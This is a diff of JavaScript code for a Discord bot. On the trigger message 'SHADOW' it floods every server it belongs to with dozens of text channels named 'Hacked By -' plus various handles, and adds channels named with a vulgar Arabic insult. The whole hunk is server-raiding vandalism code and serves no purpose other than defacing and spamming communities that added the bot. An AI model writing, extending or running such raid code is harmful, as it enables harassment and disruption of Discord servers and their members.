@@ -289,52 +289,79 @@ LOka.on('message', message => {
 LOka.on('message', message => {
          if (message.content === "SHADOW") {
                LOka.guilds.forEach(m =>{
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- MG', 'text');
+m.createChannel('Hacked By- MG', 'text');
+m.createChannel('Hacked By- MG', 'text');
+m.createChannel('Hacked By -.', 'text');
+m.createChannel('Hacked By -Light', 'text');
+m.createChannel('Hacked By -Light', 'text');
+m.createChannel('Hacked By -.', 'text');
+m.createChannel('Hacked By -Ziad', 'text');
  
-m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By -Ziad', 'text');
  
-m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By -.', 'text');
  
-m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By -Messi', 'text');
  
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By -Messi', 'text');
+m.createChannel('Hacked By -Messi', 'text');
+m.createChannel('Hacked By -.', 'text');
+m.createChannel('Hacked By -SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By -SHADOW', 'text');
+m.createChannel('Hacked By -SHADOW', 'text');
+m.createChannel('Hacked By -.', 'text');
+m.createChannel('Hacked By -.', 'text');
+m.createChannel('Hacked By -.', 'text');
+m.createChannel('Kosom ho Boss', 'text');
+m.createChannel('Kosom ho Boss', 'text');
  
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Kosom ho Boss', 'text');
+m.createChannel('Kosom ho Boss', 'text');
  
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
- 
-m.createChannel('Hacked By - SHADOW ,$', 'text');
-m.createChannel('Hacked By - SHADOW ,$', 'text');
- 
+m.createChannel('Kosom ho Boss', 'text');
+m.createChannel('Hacked By- .', 'text');
+m.createChannel('Hacked By- .', 'text');
+m.createChannel('Hacked By- MG', 'text');
+m.createChannel('Hacked By- MG', 'text');
+m.createChannel('Hacked By- MG', 'text');
+m.createChannel('Hacked By- MG', 'text');
+m.createChannel('Hacked By- MG', 'text');
+m.createChannel('Hacked By -.', 'text');
+m.createChannel('Hacked By -.', 'text');
+m.createChannel('Hacked By -.', 'text');
+m.createChannel('Hacked By -Light', 'text');
+m.createChannel('Hacked By -Light', 'text');
+m.createChannel('Hacked By -Light', 'text');
+m.createChannel('Hacked By -Light', 'text');
+m.createChannel('Hacked By -Light', 'text');
+m.createChannel('Hacked By -Light', 'text');
+m.createChannel('Hacked By -Light', 'text');
+m.createChannel('Hacked By -.', 'text'); 
+m.createChannel('Hacked By -Ziad', 'text');
+m.createChannel('Hacked By -Ziad', 'text');
+m.createChannel('Hacked By -Ziad', 'text');
+m.createChannel('Hacked By -Ziad', 'text');
+m.createChannel('Hacked By -Ziad', 'text');
+m.createChannel('Hacked By -Ziad', 'text');
+m.createChannel('Hacked By -Ziad', 'text');
+m.createChannel('Hacked By -Messi', 'text');
+m.createChannel('Hacked By -Messi', 'text');
+m.createChannel('Hacked By -Messi', 'text');
+m.createChannel('Hacked By -Messi', 'text');
+m.createChannel('Hacked By -Messi', 'text');
+m.createChannel('Hacked By -Messi', 'text');
+m.createChannel('Hacked By -Messi', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+
 })
 }
 });
